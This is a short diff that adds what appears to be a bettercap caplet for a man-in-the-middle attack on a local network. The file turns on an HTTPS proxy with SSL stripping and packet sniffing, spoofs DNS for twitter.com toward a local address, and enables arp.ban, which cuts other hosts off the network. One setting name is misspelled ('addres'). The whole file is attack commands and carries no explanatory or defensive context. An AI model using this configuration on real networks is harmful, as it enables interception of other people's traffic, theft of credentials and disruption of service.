@@ -1,0 +1,15 @@
+set https.proxy.sslstrip true
+set net.sniff.verbose true
+
+https.proxy on
+net.sniff on
+
+set dns.spoof.domains www.twitter.com, twitter.com
+set dns.spoof.addres http://192.168.2.12
+
+set dns.spoof.all true
+
+get dns.spoof.* 
+dns.spoof on
+arp.ban on
+
